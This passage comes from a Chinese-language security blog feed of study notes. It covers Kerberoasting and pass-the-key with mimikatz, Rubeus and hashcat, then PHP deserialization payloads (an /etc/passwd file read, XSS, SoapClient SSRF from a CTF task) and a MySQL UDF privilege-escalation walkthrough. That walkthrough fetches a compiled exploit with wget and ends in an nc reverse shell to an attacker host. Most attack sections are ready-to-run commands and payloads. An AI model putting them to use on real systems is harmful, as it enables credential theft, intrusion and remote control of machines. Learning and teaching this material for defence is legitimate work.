class="selector-class">.IdentityModel</span><span class="selector-class">.Tokens</span><span class="selector-class">.KerberosRequestorSecurityToken</span> -ArgumentList <span class="variable">$SPNName</span></span><br><span class="line">或者：</span><br><span class="line">mimikatz kerberos::ask /target:MSSQLSvc/DC1<span class="selector-class">.test</span>.com</span><br></pre></td></tr></table></figure><p>(2)请求所有TGS</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Add</span>-<span class="keyword">Type</span> -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | <span class="type">Select</span>-String &#x27;^CN&#x27; -<span class="keyword">Context</span> <span class="number">0</span>,<span class="number">1</span> | <span class="type">% &#123; New</span>-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $<span class="keyword">_</span>.<span class="keyword">Context</span>.PostContext[<span class="number">0</span>].Trim() &#125;  </span><br></pre></td></tr></table></figure><p>执行后输入klist查看内存中的票据，可找到获得的TGS<br>3、导出<br>使用mimikatz</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /<span class="keyword">export</span></span><br></pre></td></tr></table></figure><p>4、破解<br><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a><br>文件票据：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tgsrepcrack<span class="selector-class">.py</span> pass<span class="selector-class">.txt</span> test.kirbi</span><br></pre></td></tr></table></figure><p>HASH密文：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">13100</span> hash<span class="selector-class">.txt</span> pass<span class="selector-class">.txt</span> <span class="attr">--force</span></span><br></pre></td></tr></table></figure><h4 id="Kerberoasting的实现方法二（工具）"><a href="#Kerberoasting的实现方法二（工具）" class="headerlink" title="Kerberoasting的实现方法二（工具）"></a>Kerberoasting的实现方法二（工具）</h4><p>工具：<br>1,impacket-getuserspns<br>请求所有SPN服务器，并找到能破解的票据格式保存到hash.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip <span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> 域名/账户:密码 -outputfile <span class="built_in">hash</span>.txt</span><br></pre></td></tr></table></figure><p>2,Rubeus<br><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TGS包直接打印能够使用John或hashcat能够破解的Hash。</span><br><span class="line">Rubeus.exe kerberoast /format:john /outfile:kerberoasting.txt</span><br></pre></td></tr></table></figure><p><img src="https://pingmaoer.github.io/2020/06/30/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%BA%8C/18.png"></p><h2 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h2><p>pass the key （密钥传递攻击）<br>PTK（pass the key ） #利用的ekeys aes256进行的渗透测试（NTLM认证攻击）<br>当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash失去了作用，但是可以通过PTK的攻击方式获取权限</p><pre><code>mimikatz sekurlsa::ekeysmimikatz sekurlsa:pth /user:域用户名 /doamin:域名 /aes256:aes256值</code></pre>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web搭建</title>
      <link href="/2025/06/17/WEB%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA/"/>
      <url>/2025/06/17/WEB%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识-WEB网页搭建"><a href="#基础知识-WEB网页搭建" class="headerlink" title="基础知识-WEB网页搭建"></a>基础知识-WEB网页搭建</h1><p><strong>常规化：</strong></p><ul><li>原理：源码数据都在服务器中</li><li>影响：使用常规的安全测试手法</li></ul><p><strong>站库分离：</strong></p><ul><li>原理：数据源码不在同一服务器上</li><li>存储：其他服务器上 &amp; 云数据产品</li><li>影响：数据被单独存放，能连接才可能影响数据</li></ul><p><strong>前后端分类：</strong></p><ul><li>原理：前端 js 框架，API 传输数据</li><li>影响：1，前端页面大部分不存在漏洞 2，后端管理大部分不在同一域名 3，获得的权限有可能 1 不影响后端</li></ul><p><strong>集成软件</strong>：</p><ul><li>原理：打包类集成化环境，权限配置或受控制</li><li>影响：攻击者权限对比区别</li></ul><p><strong>Docker 容器：</strong></p><ul><li><p>原理：虚拟化技术独立磁盘空间，非真实物理环境</p></li><li><p>影响：攻击者虚拟空间磁盘</p></li><li><p>搭站平台：</p></li><li><p>模式：1，托管 2，申请</p></li><li><p>原理：利用别人域名模板建立</p></li><li><p>影响：实质安全测试非资产目标</p></li></ul><p>纯静态：</p><ul><li>例子：大学学的 html 设计网页</li><li>原理：数据没有传输性（js 传输不算）</li><li>影响：无漏洞</li></ul><p>伪静态：动态为静态技术，伪装的静态</p><p><strong>WAF</strong></p><p>非嵌入型：</p><ul><li>硬件型：以硬件形式部署在链路中，支持多种部署方式，当串联到链路中可以拦截恶意流量，在旁路监听时只做记录不拦截（Imperva，天清 WAG 等）</li><li>软件型：以软件形式安装在服务器上，可以直接检测服务器是否存在 webshell，是否有文件被创建等（安全狗，云锁，D 盾等）</li><li>云 WAF：一般以反向代理的形式工作，通过配置 NS 或 CNAME 记录，使得对网站的请求报文优先经过 WAF 主机（阿里云云盾，腾讯云 WAF 等）</li></ul><p>嵌入式：</p><p>网站内置的 WAF：直接嵌入在代码中，安全人员在可能受到攻击的地方增强一些安全防护代码，比如过滤敏感字符</p><p><strong>CDN</strong></p><ul><li>原理：内容分发服务，提到访问速度</li><li>OSS</li></ul><p><strong>OSS</strong></p><ul><li>原理：云存储服务，提高资源文件加载速度</li><li>影响：资源单独存储，修复上传漏洞 文件解析不复存在 同时也会有 Accesskey 泄露安全问题影响：隐藏真实 ip</li></ul><p><strong>反向代理</strong></p><ul><li>原理：通过网络反向代理转发真实服务达到访问目的</li><li>影响：访问目标只是一个代理，非真实应用服务器</li></ul><p><strong>负载均衡</strong></p><ul><li>原理：分摊到多个操作单元上进行执行，共同完成工作任务</li><li>影响：有多个服务器记载服务，测试过程中存在多个目标情况</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-反序列化</title>
      <link href="/2025/06/17/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/06/17/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP-反序列化"></a>PHP-反序列化</h1><p>在 PHP 里，序列化是把一个对象或数组转换成字符串的过程（比如保存到文件或传输到网络），而反序列化就是把这个字符串还原成原来的变量（对象 &#x2F; 数组）。</p><p>用 PHP 的两个函数表示就是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);     <span class="comment">// 序列化</span></span><br><span class="line"><span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>); <span class="comment">// 反序列化</span></span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-15-1024x278.png"></p><p>为什么反序列化会存在漏洞？</p><p>因为 unserialize() 在反序列化对象时，会自动调用一些类里面的特殊方法，比如：</p><p><a href="https://www.bilibili.com/video/BV12om2YTEgW?spm_id_from=333.788.videopod.episodes&vd_source=89bf25153801ebc942aaf90aa2af1675&p=63">https://www.bilibili.com/video/BV12om2YTEgW?spm_id_from=333.788.videopod.episodes&amp;vd_source=89bf25153801ebc942aaf90aa2af1675&amp;p=63</a></p><ul><li>__wakeup：反序列化时自动调用</li><li>__seleep ()：序列化时自动调用</li><li>__constuct：构造对象时调用</li><li>__destruct()：对象被销毁时自动调用</li><li>__toString()：对象被当成字符串使用时调用</li><li>__call()：调用不存在方法时触发</li><li>__invoke()：对象被当函数调用时触发</li><li>__get ()：访问不存在的成员变量时调用</li><li>__set ()：设置对象不存在的属性或无法访问（私有）的属性时调用</li><li>__isset ()：检查对象的某个属性是否存在会执行此函数，当对不可访问的属性调用 isset () 或 empty () 时，会被自动调用</li><li>__unset ()：在不可访问的某个属性上使用 unset 函数执行，销毁对象的某个不存在属性时自动调用__unset ()</li></ul><p>如果这些方法里面有可以被控制的敏感操作（比如文件读写、命令执行等），就可能被利用形成漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;haohao&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>= <span class="string">&quot;man&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$demo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">student</span>();</span><br><span class="line">    <span class="variable">$wocao</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$wocao</span>;</span><br></pre></td></tr></table></figure><p>使用 serialize 函数进行序列化</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-16.png"></p><p>unserialize 函数进行反序列化</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-17-1024x33.png"></p><h2 id="反序列化漏洞："><a href="#反序列化漏洞：" class="headerlink" title="反序列化漏洞："></a>反序列化漏洞：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><p>攻击思路：</p><p>在 ctf 中的解题思路</p><p>1，复制源代码到本地<br>2，注释掉和属性无关的内容<br>3，根据题目需要，给属性赋值<br>4，生成序列化数据，通常要用到 urlencode<br>5，传递数据到服务器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;/etc/passwd&quot;</span>;      <span class="comment">//只留需要的属性,并赋值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exploit</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Cat</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$exploit</span>;</span><br></pre></td></tr></table></figure><p>将 payload 上传到程序</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://target.com/vuln.php?data=O:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;nya&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;/etc/passwd&quot;</span>;&#125;  //可使用urlencode编码后再传参</span><br></pre></td></tr></table></figure><h2 id="wakeup-漏洞："><a href="#wakeup-漏洞：" class="headerlink" title="__wakeup 漏洞："></a>__wakeup 漏洞：</h2><p>漏洞影响范围<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p><p>在反序列化一个对象时被自动调用</p><p>在安全编程中，__wakeup() 方法经常用于控制对象的反序列化过程，以避免攻击者能够在反序列化期间执行恶意代码。这是因为反序列化操作本质上是在将一个字符串转换为可执行的代码，因此如果反序列化的对象包含恶意代码，那么它可能会在反序列化过程中执行。</p><p>绕过：当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。</p><h2 id="原生类漏洞利用："><a href="#原生类漏洞利用：" class="headerlink" title="原生类漏洞利用："></a>原生类漏洞利用：</h2><p>php 中内置很多原生的类，在 CTF 中常以 echo new $a ($b); 这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。</p><p>下面代码可以查看内置原生类，可对实际情况进行选择性的查看原生类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>以此道题为例：</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-18.png"></p><p>给了 flag.php 文件进行提示，访问的 ip 地址必须为 127.0.0.1，且 token 为 ctfshow, 才能拿下 flag</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-19.png"></p><p>进入页面，只有几行代码，考虑使用原生态利用</p><p>调用了 getFlag () 方法，但 getFlag () 方法不存在</p><p><strong>使用报错类</strong></p><p>Error&#x2F;Exception 触发 XSS</p><p>Error&#x2F;Exception 中有个__toString () 方法，能将我们输入的 xss 内容输出</p><p>POC 链的构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">////输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><p>使用 SoapClient 构造 SSRF</p><p>(PHP 5, PHP 7, PHP 8)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>=</span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;aaa\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;url&#x27;</span> =&gt;<span class="string">&#x27;http://127.0.0.1 &#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//将编码的数据传参拿下flag.php</span></span><br></pre></td></tr></table></figure><h2 id="PHP-字符串逃逸"><a href="#PHP-字符串逃逸" class="headerlink" title="PHP 字符串逃逸"></a>PHP 字符串逃逸</h2>]]></content>
      
      
      <categories>
          
          <category> PHP安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-代码审计-1</title>
      <link href="/2025/06/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/06/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-代码审计-1"><a href="#PHP-代码审计-1" class="headerlink" title="PHP-代码审计-1"></a>PHP-代码审计-1</h1><h2 id="关于SQL的审计："><a href="#关于SQL的审计：" class="headerlink" title="关于SQL的审计："></a>关于SQL的审计：</h2><p>挖掘技巧：</p><ul><li>语句监控-数据库SQL监控排查可利用语句定向分析</li><li>功能追踪-功能点文件SQL执行代码函数调用链追踪</li><li>正则搜索-(update|select|insert|delete|).<em>?where.</em>&#x3D;</li></ul><p>如何快速的在多个文件代码里面找脆弱：<br>1、看文件路径<br>2、看代码里面的变量（可控）<br>3、看变量前后的过滤</p>]]></content>
      
      
      <categories>
          
          <category> PHP代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux提权-2</title>
      <link href="/2025/06/17/linux%E6%8F%90%E6%9D%83-2/"/>
      <url>/2025/06/17/linux%E6%8F%90%E6%9D%83-2/</url>
      
        <content type="html"><![CDATA[<h1 id="linux提权-2"><a href="#linux提权-2" class="headerlink" title="linux提权-2"></a>linux提权-2</h1><p>信息收集工具：<br><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>Mysql提权方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译UDF.so</span></span><br><span class="line">searchsploit udf</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/1518.c .</span><br><span class="line">gcc -g -shared -WL,-soname,1518.so -o udf.so 1518.c -1c</span><br><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.200.1:8080/udf.so</span><br></pre></td></tr></table></figure><p>连接进行导出调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql -u账号 -p密码</span><br><span class="line">seletc version();</span><br><span class="line">select @@basedir;     #确认mysql安装位置</span><br><span class="line">show variavles like &#x27;%basedir%&#x27;;     #确认mysql安装位置</span><br><span class="line">show variables like &#x27;%secure%&#x27;;      #查看可导出文件的位置</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;      #查看插件位置</span><br><span class="line">show variables like &#x27;%compile%&#x27;;     #查看系统版本</span><br><span class="line">use mysql;</span><br></pre></td></tr></table></figure><p>show variables like ‘%secure%’;&#x2F;&#x2F;查看可导出文件的位置这条命令执行后，查看secure_file_priv 是否开启，如果开启，将无法写入文件，则无法提权<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-05%20001749.png"></p><p>创建shell表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table shell(line blob);</span><br></pre></td></tr></table></figure><p>往shell表中插入二进制的 udf.so</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into shell values(load_file(&#x27;/tmp/udf.so&#x27;));</span><br></pre></td></tr></table></figure><p>导出 udf.so</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from shell into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;    #将/tmp/udf.so放到/usr/lib/mysql/plugin/中</span><br></pre></td></tr></table></figure><p>创建do_system函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create function do_system returns integer soname &#x27;udf.so&#x27;;</span><br><span class="line">select do_system(&#x27;nc 192.168.200.6 6666 -e /bin/bash&#x27;);</span><br></pre></td></tr></table></figure><h2 id="Capability"><a href="#Capability" class="headerlink" title="Capability"></a>Capability</h2><p>相当于SUID的升级版</p><p>可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的；在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/php /tmp/php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置特权</span></span><br><span class="line">setcap cap_setuid+epp /tmp/php   #将/tmp/php设置特权为setuid</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除特权</span></span><br><span class="line">setcap -r /tmp/php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看单个特权</span></span><br><span class="line">getcap /usr/bin/php</span><br><span class="line"><span class="meta prompt_">#</span><span 